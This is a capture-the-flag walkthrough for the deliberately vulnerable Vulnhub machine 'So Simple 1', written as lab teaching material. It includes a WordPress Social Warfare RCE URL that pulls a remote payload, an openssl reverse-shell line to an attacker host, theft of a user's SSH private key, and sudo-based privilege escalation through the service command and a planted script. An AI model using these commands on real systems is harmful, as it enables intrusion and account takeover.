# So Simple 1

---

Machine by [@roelvb79](https://twitter.com/roelvb79)

Vulnhub [link](https://www.vulnhub.com/entry/so-simple-1,515/)

Objectives:

  * 2 user flags
  * 1 root flag

---

## Network scan


  
1. Use nmap to scan the network

    We'll use an intense scan on the victim vm (192.168.56.111), we can see web and ssh services running, but no aparent vulnerabilities yet.

    ![victim machine nmap scan result](img/1-nmap.png)
   
<br>

2. Visit the website

    If we visit the website we can see that there is only a big red image with the words "SO SIMPLE":
   
    ![website](img/2-website.png)

    And the website code doesn't reveal anything that's useful:

    ![website origin code](img/3-website_origin.png)

<br>

3. Attempt an ssh login

   Attempting to login with ssh shows it only accepts key authentication, thus ruling out ssh brute force with common passwords, if we want a way in we'll need an alternative


<br>

4. We'll run drib

    As there is no vulnerability that we can see in plain sight, dirb, will show us what are some sub-directories, and we can see that wordpress is installed:
  
    ![dirb website results](img/4-dirb.png)

<br>

5. Use WPScan

   As we saw on the las step wordpress is installed, WPScan will show wordpress, plugins and themes versions, as well as vulnerabilities associated with them, for this we'll need an api key that we can get by creating a free account.

   And we'll run the command:  `sudo wpscan --api-token <API> --url http://192.168.56.111/wordpress/ -e`
   
   ![wpscan result](img/5-wpscanFirst.png)

   Here we can see that the plugin "Social Warfare has an RCE vulnerability that is probably going to work:

   ![wpscan social warfare RCE](img/6-wpscanSocialWarfare.png)

   If we scroll down further we can see the wordpress users that exist, we can see "admin" and "max":

   ![wpscan users](img/7-wpscanUsers.png)

<br>

6. Prepare the exploit

   We can see that Social Warfare 3.5.0 has a RCE [vulnerability](https://wpscan.com/vulnerability/7b412469-cc03-4899-b397-38580ced5618/). To exploit it we'll need a web server and a payload and a netcat listener to get a reverse shell.

    - Web server

       We need a web server to serve our payload, this will be apache as it's simple and comes pre-installed on kali, we only need to enable it:

       ![enable apache](img/7-apacheStart.png)


    - Netcat
 
       We need a netcat instance to listen to our reverse shell and catch it, this will use openssl and you can find more info on the [swisskeyrepo](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md#openssl) repository by [Swissky](https://github.com/swisskyrepo).
   
       The command to execute will be `ncat --ssl -vv -l -p 4242`.
       This will listen for any connection on port 4242.
      
       ![running netcat listener](img/8-ncatListener.png)
 
    - Payload
      
       The payload also comes from the same repo and it will be placed on the file `/var/www/html/payload.txt` and contain the next code:
      
        ```system('mkfifo /tmp/s; /bin/bash -i < /tmp/s 2>&1 | openssl s_client -quiet -connect ATTACKER_MACHINE:4242 > /tmp/s; rm /tmp/s')```

      ![cat of the payload](img/9-catPayload.png)

      The "ATTACKER_MACHINE" needs to be changed to our kali machine, in my case 192.168.56.1.. and the port needs to match the netcat listener above.

<br>

7. Using the exploit

   To run the exploit we need to visit the next url on a web browser:

   `http://WEBSITE/wordpress/wp-admin/admin-post.php?swp_debug=load_options&swp_url=http://ATTACKER_HOST/payload.txt`

   The "ATTACKER_MACHINE" needs to be changed to our kali machine, in my case 192.168.56.1.. and "VICTIM_MACHINE to our so simple:1 vm, in my case 192.168.56.111

   Here we can see what happens after visiting the URL:
   
   ![Exploit on web browser result](img/10-exploitWeb.png)

   And if we go back to the ncat terminal we can see that it has established the connection and now we have a shell with the user "www-data":
   
   ![ncat receives the shell](img/11-exploitNcat.png)
   
<br>

8. Get a user ssh key

  If we cd into the .ssh folder of the user "max", we can copy his ssh key, it's called id_rsa, we can use cat to list it and then copy it into a file called "key" on our kali machine.
  
  ![copying the ssh key of user max](img/12-sshCopyKey.png)

  After copying id_rsa off of the user, we will add it into a file called key, it's important to change the file permissions to 700, and not using sudo to add the key:
  
  ![adding max's ssh key to our system](img/13-addingKey.png)

  And now we can ssh into the server as user max, add the fingerprint, and we'll have ssh access:

  ![connecting to user max with ssh](img/14-sshConnection.png)

9. Retreiving the first user flag.

  Once inside and as user "max", if we ls their home directory we can see "personal.txt" this file is not useful, "this" is a folder with a bunch of subfolders with a little easter-egg and "user.txt" wich is the user flag we're after:

  ![getting the flag with cat of the file user.txt](img/15-firstFlag.png)

10. Changing users

   First we'll use the command `sudo -l` to list what services or scripts we have access to as root, but without using a password:

   ![using sudo -l to list permissions](img/16-escalatingprivileges1.png)

   We can see that  we have access to the service `/usr/sbin/service`.

   After listing `/etc/passwd` we can see user steven, we can use `/usr/sbin/service` to change into user steven and dig further.

   To change users we would need either the root password or the other user's password, because we have root access to the service command, we can use it to our advantage:

   First of all we use sudo permissions to skip the steven login. Then `-u` to say we want to change user and `steven` to indicat to what user. Then `/usr/sbin/service` is the command we will execute, and `../../bin/bash` is the next command to execute, wich happens to be the shell that we want to use.
   
   `sudo -u steven /usr/sbin/service ../../bin/bash`

   ![using service to change into steven](img/17-escalatingprivileges2.png)

11. Getting the second Flag

   Once we have logged in as the user steven, we can navigate to his home directory and cat the second flag:

   ![getting the second flag on the user steven's home folder](img/18-secondFlag.png)

   We can also list the hidden contents of the user's home, but we can't see anything really useful:

   ![ls of hidden contents of user steven's home](img/19-escalatingtoroot1.png)
   
12. Escalating privileges to root.

   


---

---

# Ignore

13- once in we can cat the file user.txt and get the first flag
14- using "sudo -l" we'll know what the user has acces to use as root without asking a password, this will return that the user can use /usr/sbin/service.
15- we will use "sudo -u steven /usr/sbin/service ../../bin/bash" this will change to the user steven with the permissions of max /usr/sbin/service and will make sure that we acces the user with /bin/bash as the interpreter.
16- repeat "sudo -l" for user steven, will return a "/opt/tools/server-health.sh" file (non existant), we'll create the folder tools and file server-health.sh. this file will contain: 
#!/bin/bash

bash
17- then we will "chmod +x /opt/tools/server-health.sh"
18- we can use "sudo -u root /opt/tools/server-health.sh" to get root access to the machine.
19- copy the root's ssh private key for direct root access to the machine, and get the flag from inside the root's home folder
WpScan
